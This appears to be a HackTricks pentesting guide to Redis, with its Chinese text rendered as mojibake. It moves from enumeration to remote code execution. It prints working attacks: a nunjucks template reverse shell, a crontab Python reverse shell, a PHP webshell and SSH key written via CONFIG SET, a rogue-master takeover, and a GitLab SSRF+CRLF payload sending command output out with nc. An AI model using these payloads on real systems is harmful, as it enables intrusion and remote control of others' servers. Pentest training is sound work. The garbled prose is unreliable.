# 6379 - Redisæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**æ— éœ€å»¶è¿Ÿè·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­è·å¾—ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## åŸºæœ¬ä¿¡æ¯

Redisæ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSDè®¸å¯è¯ï¼‰çš„å†…å­˜**æ•°æ®ç»“æ„å­˜å‚¨**ï¼Œç”¨ä½œ**æ•°æ®åº“**ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://redis.io/topics/introduction)ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedisä½¿ç”¨åŸºäºçº¯æ–‡æœ¬çš„åè®®ï¼Œä½†æ‚¨å¿…é¡»è®°ä½å®ƒä¹Ÿå¯ä»¥å®ç°**ssl/tls**ã€‚äº†è§£å¦‚ä½•åœ¨æ­¤å¤„[ä½¿ç”¨ssl/tlsè¿è¡ŒRedis](https://fossies.org/linux/redis/TLS.md)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## è‡ªåŠ¨æšä¸¾

ä¸€äº›è‡ªåŠ¨åŒ–å·¥å…·å¯ä»¥å¸®åŠ©è·å– Redis å®ä¾‹çš„ä¿¡æ¯ï¼š
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## æ‰‹åŠ¨æšä¸¾

### æ¨ªå¹…

Redisæ˜¯ä¸€ç§**åŸºäºæ–‡æœ¬çš„åè®®**ï¼Œæ‚¨åªéœ€**åœ¨å¥—æ¥å­—ä¸­å‘é€å‘½ä»¤**ï¼Œè¿”å›çš„å€¼å°†å¯è¯»ã€‚è¿˜è¦è®°ä½ï¼ŒRediså¯ä»¥ä½¿ç”¨**ssl/tls**è¿è¡Œï¼ˆä½†è¿™éå¸¸å¥‡æ€ªï¼‰ã€‚

åœ¨å¸¸è§„çš„Rediså®ä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`nc`è¿›è¡Œè¿æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨`redis-cli`ï¼š
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
ä½ å¯ä»¥å°è¯•çš„**ç¬¬ä¸€ä¸ªå‘½ä»¤**æ˜¯**`info`**ã€‚å®ƒå¯èƒ½è¿”å›Rediså®ä¾‹çš„ä¿¡æ¯è¾“å‡ºï¼Œæˆ–è€…è¿”å›ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š
```
-NOAUTH Authentication required.
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™æ„å‘³ç€**æ‚¨éœ€è¦æœ‰æ•ˆçš„å‡­æ®**æ‰èƒ½è®¿é—®Rediså®ä¾‹ã€‚

### Redisèº«ä»½éªŒè¯

**é»˜è®¤æƒ…å†µä¸‹**ï¼Œå¯ä»¥**æ— éœ€å‡­æ®**è®¿é—®Redisã€‚ä½†æ˜¯ï¼Œå¯ä»¥è¿›è¡Œ**é…ç½®**ä»¥ä»…æ”¯æŒ**å¯†ç æˆ–ç”¨æˆ·å+å¯†ç **ã€‚\
å¯ä»¥åœ¨_**redis.conf**_æ–‡ä»¶ä¸­ä½¿ç”¨å‚æ•°`requirepass`è®¾ç½®å¯†ç ï¼Œ**æˆ–è€…åœ¨æœåŠ¡é‡æ–°å¯åŠ¨è¿æ¥åˆ°Rediså¹¶è¿è¡Œ`config set requirepass p@ss$12E45`**æ—¶ä¸´æ—¶è®¾ç½®å¯†ç ã€‚\
æ­¤å¤–ï¼Œå¯ä»¥åœ¨_**redis.conf**_æ–‡ä»¶ä¸­çš„å‚æ•°`masteruser`ä¸­é…ç½®**ç”¨æˆ·å**ã€‚

{% hint style="info" %}
å¦‚æœä»…é…ç½®äº†å¯†ç ï¼Œåˆ™ä½¿ç”¨çš„ç”¨æˆ·åæ˜¯â€œ**default**â€ã€‚\
æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œ**æ— æ³•ä»å¤–éƒ¨æ‰¾åˆ°**Redisæ˜¯å¦ä»…é…ç½®äº†å¯†ç æˆ–ç”¨æˆ·å+å¯†ç ã€‚
{% endhint %}

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†**éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„å‡­æ®**æ‰èƒ½ä¸Redisè¿›è¡Œäº¤äº’ï¼Œå› æ­¤å¯ä»¥å°è¯•[**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#redis)ã€‚\
**å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å‡­æ®ï¼Œè¯·åœ¨å»ºç«‹è¿æ¥åä½¿ç”¨å‘½ä»¤è¿›è¡Œèº«ä»½éªŒè¯**ï¼š
```bash
AUTH <username> <password>
```
**æœ‰æ•ˆçš„å‡­è¯**å°†ä¼šå¾—åˆ°ä»¥ä¸‹å›åº”ï¼š`+OK`

### **å·²è®¤è¯çš„æšä¸¾**

å¦‚æœRediså®ä¾‹æ¥å—**åŒ¿å**è¿æ¥æˆ–è€…ä½ æ‰¾åˆ°äº†ä¸€äº›**æœ‰æ•ˆçš„å‡­è¯**ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¼€å§‹å¯¹æœåŠ¡è¿›è¡Œæšä¸¾ï¼š
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**å…¶ä»–Rediså‘½ä»¤**å¯ä»¥åœ¨[è¿™é‡Œ](https://redis.io/topics/data-types-intro)å’Œ[è¿™é‡Œ](https://lzone.de/cheat-sheet/Redis)æ‰¾åˆ°ã€‚\
è¯·æ³¨æ„ï¼Œ**Rediså®ä¾‹çš„å‘½ä»¤å¯ä»¥åœ¨redis.confæ–‡ä»¶ä¸­è¢«é‡å‘½åæˆ–åˆ é™¤**ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹è¡Œå°†åˆ é™¤FLUSHDBå‘½ä»¤ï¼š
```
rename-command FLUSHDB ""
```
æ›´å¤šå…³äºå®‰å…¨é…ç½®RedisæœåŠ¡çš„ä¿¡æ¯è¯·å‚è€ƒï¼š[https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å‘½ä»¤**`monitor`**å®æ—¶ç›‘æ§æ‰§è¡Œçš„Rediså‘½ä»¤ï¼Œæˆ–è€…ä½¿ç”¨**`slowlog get 25`**è·å–å‰25ä¸ªæœ€æ…¢çš„æŸ¥è¯¢å‘½ä»¤ã€‚

åœ¨è¿™é‡Œå¯ä»¥æ‰¾åˆ°æ›´å¤šæœ‰å…³Rediså‘½ä»¤çš„æœ‰è¶£ä¿¡æ¯ï¼š[https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **æ•°æ®åº“è½¬å‚¨**

åœ¨Redisä¸­ï¼Œ**æ•°æ®åº“æ˜¯ä»0å¼€å§‹çš„æ•°å­—**ã€‚æ‚¨å¯ä»¥é€šè¿‡å‘½ä»¤`info`çš„è¾“å‡ºä¸­çš„"Keyspace"å—æ¥æŸ¥æ‰¾æ˜¯å¦æœ‰ä»»ä½•æ•°æ®åº“æ­£åœ¨ä½¿ç”¨ï¼š

![](<../.gitbook/assets/image (315).png>)

æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–æ‰€æœ‰çš„**keyspaces**ï¼ˆæ•°æ®åº“ï¼‰ï¼š
```
INFO keyspace
```
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ­£åœ¨ä½¿ç”¨**æ•°æ®åº“0å’Œ1**ã€‚**æ•°æ®åº“0åŒ…å«4ä¸ªé”®ï¼Œæ•°æ®åº“1åŒ…å«1ä¸ªé”®**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRediså°†ä½¿ç”¨æ•°æ®åº“0ã€‚ä¸ºäº†å¯¼å‡ºä¾‹å¦‚æ•°æ®åº“1ï¼Œæ‚¨éœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
å¦‚æœåœ¨è¿è¡Œ`GET <KEY>`æ—¶å‡ºç°`-WRONGTYPEæ“ä½œé’ˆå¯¹ä¿å­˜é”™è¯¯ç±»å‹å€¼çš„é”®`çš„é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºé”®å¯èƒ½ä¸æ˜¯å­—ç¬¦ä¸²æˆ–æ•´æ•°ï¼Œéœ€è¦ä½¿ç”¨ç‰¹æ®Šæ“ä½œç¬¦æ¥æ˜¾ç¤ºå®ƒã€‚

è¦äº†è§£é”®çš„ç±»å‹ï¼Œè¯·ä½¿ç”¨`TYPE`å‘½ä»¤ï¼Œä»¥ä¸‹æ˜¯åˆ—è¡¨å’Œå“ˆå¸Œé”®çš„ç¤ºä¾‹ã€‚
```
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]
```
**ä½¿ç”¨npm** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **æˆ–python** [**redis-utils**](https://pypi.org/project/redis-utils/) **æ¥è½¬å‚¨æ•°æ®åº“ã€‚**

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof æ˜¯æ‰€æœ‰åŠ å¯†è´§å¸æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProof çš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­è·å¾—ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¶ä»£æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶ç™»ä¸Šæ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­èµšå–æ”¶å…¥ï¼

{% embed url="https://hackenproof.com/register" %}

## Redis RCE

### äº¤äº’å¼Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) å¯ä»¥è‡ªåŠ¨åœ¨Redisï¼ˆ<=5.0.5ï¼‰ä¸­è·å–äº¤äº’å¼Shellæˆ–åå‘Shellã€‚
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

æ¥è‡ª[**è¿™é‡Œ**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)çš„ä¿¡æ¯ã€‚æ‚¨å¿…é¡»çŸ¥é“**ç½‘ç«™æ–‡ä»¶å¤¹çš„è·¯å¾„**ï¼š
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
å¦‚æœWebshellè®¿é—®å¼‚å¸¸ï¼Œæ‚¨å¯ä»¥åœ¨å¤‡ä»½åæ¸…ç©ºæ•°æ®åº“ï¼Œç„¶åå†æ¬¡å°è¯•ï¼Œè®°å¾—æ¢å¤æ•°æ®åº“ã€‚

### æ¨¡æ¿Webshell

ä¸å‰ä¸€èŠ‚ç±»ä¼¼ï¼Œæ‚¨è¿˜å¯ä»¥è¦†ç›–ä¸€äº›å°†ç”±æ¨¡æ¿å¼•æ“è§£é‡Šçš„HTMLæ¨¡æ¿æ–‡ä»¶ï¼Œå¹¶è·å¾—ä¸€ä¸ªShellã€‚

ä¾‹å¦‚ï¼Œæ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/)ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ”»å‡»è€…åœ¨ä¸€ä¸ªç”±**nunjucksæ¨¡æ¿å¼•æ“è§£é‡Šçš„HTML**ä¸­æ³¨å…¥äº†ä¸€ä¸ª**åå‘Shell**ï¼š
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œ**å¤šä¸ªæ¨¡æ¿å¼•æ“ä¼šå°†æ¨¡æ¿ç¼“å­˜åœ¨å†…å­˜ä¸­**ï¼Œå› æ­¤å³ä½¿æ‚¨è¦†ç›–å®ƒä»¬ï¼Œæ–°çš„æ¨¡æ¿ä¹Ÿ**ä¸ä¼šè¢«æ‰§è¡Œ**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦ä¹ˆå¼€å‘äººå‘˜ä¿ç•™äº†è‡ªåŠ¨é‡æ–°åŠ è½½åŠŸèƒ½ï¼Œè¦ä¹ˆæ‚¨éœ€è¦å¯¹æœåŠ¡è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰ï¼Œå¹¶æœŸæœ›å®ƒä¼šè‡ªåŠ¨é‡æ–°å¯åŠ¨ã€‚
{% endhint %}

### SSH

è¯·æ³¨æ„ï¼Œåœ¨æ‰§è¡Œå…¶ä»–æ‰‹åŠ¨åˆ©ç”¨å‘½ä»¤ä¹‹åï¼Œ**`config get dir`** çš„ç»“æœå¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚å»ºè®®åœ¨ç™»å½•åˆ° Redis åç«‹å³è¿è¡Œæ­¤å‘½ä»¤ã€‚åœ¨ **`config get dir`** çš„è¾“å‡ºä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ° **redis ç”¨æˆ·çš„ä¸»ç›®å½•**ï¼ˆé€šå¸¸ä¸º _/var/lib/redis_ æˆ– _/home/redis/.ssh_ï¼‰ï¼Œé€šè¿‡è¿™ä¸ªä¿¡æ¯ï¼Œæ‚¨å°±çŸ¥é“å¯ä»¥åœ¨å“ªé‡Œå†™å…¥ `authenticated_users` æ–‡ä»¶ä»¥é€šè¿‡ ssh ä½¿ç”¨ **redis ç”¨æˆ·**ç™»å½•ã€‚å¦‚æœæ‚¨çŸ¥é“å…¶ä»–æœ‰æ•ˆç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œå¹¶ä¸”æ‚¨å…·æœ‰å¯å†™æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥æ»¥ç”¨å®ƒï¼š

1. åœ¨æ‚¨çš„è®¡ç®—æœºä¸Šç”Ÿæˆä¸€ä¸ª ssh å…¬ç§é’¥å¯¹ï¼š**`ssh-keygen -t rsa`**
2. å°†å…¬é’¥å†™å…¥æ–‡ä»¶ï¼š**`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. å°†æ–‡ä»¶å¯¼å…¥åˆ° Redisï¼š**`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. å°†å…¬é’¥ä¿å­˜åˆ° Redis æœåŠ¡å™¨ä¸Šçš„ **authorized\_keys** æ–‡ä»¶ä¸­ï¼š

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. æœ€åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç§é’¥ **ssh** åˆ° **redis æœåŠ¡å™¨**ï¼š**ssh -i id\_rsa redis@10.85.0.52**

**æ­¤æŠ€æœ¯åœ¨æ­¤å¤„è‡ªåŠ¨åŒ–ï¼š**[https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
æœ€åä¸€ä¸ªä¾‹å­æ˜¯é’ˆå¯¹Ubuntuçš„ï¼Œå¯¹äº**Centos**ï¼Œä¸Šè¿°å‘½ä»¤åº”ä¸ºï¼š`redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨æ¥æŒ–æ¯”ç‰¹å¸ï¼š[yam](https://www.v2ex.com/t/286981#reply14)

### åŠ è½½Redisæ¨¡å—

1. æŒ‰ç…§[https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)çš„è¯´æ˜ï¼Œä½ å¯ä»¥**ç¼–è¯‘ä¸€ä¸ªRedisæ¨¡å—æ¥æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚
2. ç„¶åä½ éœ€è¦ä¸€ç§æ–¹å¼æ¥**ä¸Šä¼ ç¼–è¯‘å¥½çš„**æ¨¡å—ã€‚
3. ä½¿ç”¨`MODULE LOAD /path/to/mymodule.so`åœ¨è¿è¡Œæ—¶**åŠ è½½ä¸Šä¼ çš„æ¨¡å—**ã€‚
4. ä½¿ç”¨`MODULE LIST`**åˆ—å‡ºå·²åŠ è½½çš„æ¨¡å—**ï¼Œä»¥æ£€æŸ¥æ˜¯å¦æ­£ç¡®åŠ è½½ã€‚
5. **æ‰§è¡Œå‘½ä»¤**ï¼š

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. éšæ—¶å¸è½½æ¨¡å—ï¼š`MODULE UNLOAD mymodule`

### LUAæ²™ç›’ç»•è¿‡

[**åœ¨è¿™é‡Œ**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)ä½ å¯ä»¥çœ‹åˆ°Redisä½¿ç”¨å‘½ä»¤**EVAL**æ¥æ‰§è¡Œ**æ²™ç›’åŒ–çš„Luaä»£ç **ã€‚åœ¨é“¾æ¥çš„å¸–å­ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°å¦‚ä½•ä½¿ç”¨**dofile**å‡½æ•°æ¥æ»¥ç”¨å®ƒï¼Œä½†æ˜¯[æ˜¾ç„¶](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval)è¿™å·²ç»ä¸å†å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œå¦‚æœä½ èƒ½**ç»•è¿‡Lua**æ²™ç›’ï¼Œä½ å°±å¯ä»¥åœ¨ç³»ç»Ÿä¸Š**æ‰§è¡Œä»»æ„**å‘½ä»¤ã€‚æ­¤å¤–ï¼Œä»åŒä¸€ç¯‡å¸–å­ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€äº›**å¯¼è‡´DoSçš„é€‰é¡¹**ã€‚

ä¸€äº›**ç”¨äºç»•è¿‡LUAçš„CVE**ï¼š

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### ä¸»ä»æ¨¡å—

ä¸»Redisçš„æ‰€æœ‰æ“ä½œä¼šè‡ªåŠ¨åŒæ­¥åˆ°ä»Redisï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†æœ‰æ¼æ´çš„Redisè§†ä¸ºä»Redisï¼Œè¿æ¥åˆ°æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ä¸»Redisï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å‘è‡ªå·±çš„Redisè¾“å…¥å‘½ä»¤ã€‚
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRFä¸Redisé€šä¿¡

å¦‚æœä½ å¯ä»¥å‘é€**æ˜æ–‡è¯·æ±‚**åˆ°**Redis**ï¼Œä½ å¯ä»¥ä¸å®ƒ**è¿›è¡Œé€šä¿¡**ï¼Œå› ä¸ºRedisä¼šé€è¡Œè¯»å–è¯·æ±‚ï¼Œå¹¶å¯¹å®ƒä¸ç†è§£çš„è¡Œè¿”å›é”™è¯¯å“åº”ï¼š
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
å› æ­¤ï¼Œå¦‚æœæ‚¨åœ¨ä¸€ä¸ªç½‘ç«™ä¸­å‘ç°äº†ä¸€ä¸ªSSRFæ¼æ´ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥æ§åˆ¶ä¸€äº›å¤´éƒ¨ï¼ˆå¯èƒ½æ˜¯é€šè¿‡CRLFæ¼æ´ï¼‰æˆ–POSTå‚æ•°ï¼Œé‚£ä¹ˆæ‚¨å°†èƒ½å¤Ÿå‘Rediså‘é€ä»»æ„å‘½ä»¤ã€‚

### ç¤ºä¾‹ï¼šGitlab SSRF + CRLFåˆ°Shell

åœ¨Gitlab11.4.7ä¸­å‘ç°äº†ä¸€ä¸ªSSRFæ¼æ´å’Œä¸€ä¸ªCRLFæ¼æ´ã€‚å½“åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®æ—¶ï¼ŒSSRFæ¼æ´å­˜åœ¨äºä»URLå¯¼å…¥é¡¹ç›®çš„åŠŸèƒ½ä¸­ï¼Œå…è®¸è®¿é—®ä»»æ„IPï¼Œå½¢å¼ä¸º\[0:0:0:0:0:ffff:127.0.0.1]ï¼ˆè¿™å°†è®¿é—®127.0.0.1ï¼‰ï¼Œè€ŒCRLFæ¼æ´åˆ™æ˜¯é€šè¿‡åœ¨URLä¸­æ·»åŠ %0D%0Aå­—ç¬¦æ¥åˆ©ç”¨ã€‚

å› æ­¤ï¼Œå¯ä»¥æ»¥ç”¨è¿™äº›æ¼æ´ä¸ç®¡ç†gitlabé˜Ÿåˆ—çš„Rediså®ä¾‹è¿›è¡Œé€šä¿¡ï¼Œå¹¶æ»¥ç”¨è¿™äº›é˜Ÿåˆ—æ¥è·å–ä»£ç æ‰§è¡Œã€‚Redisé˜Ÿåˆ—æ»¥ç”¨çš„æœ‰æ•ˆè½½è·ä¸ºï¼š
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
è€Œæ»¥ç”¨SSRFå’ŒCRLFæ‰§è¡Œ`whoami`å‘½ä»¤ï¼Œå¹¶é€šè¿‡`nc`å‘é€è¾“å‡ºçš„**URLç¼–ç **è¯·æ±‚æ˜¯ï¼š
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
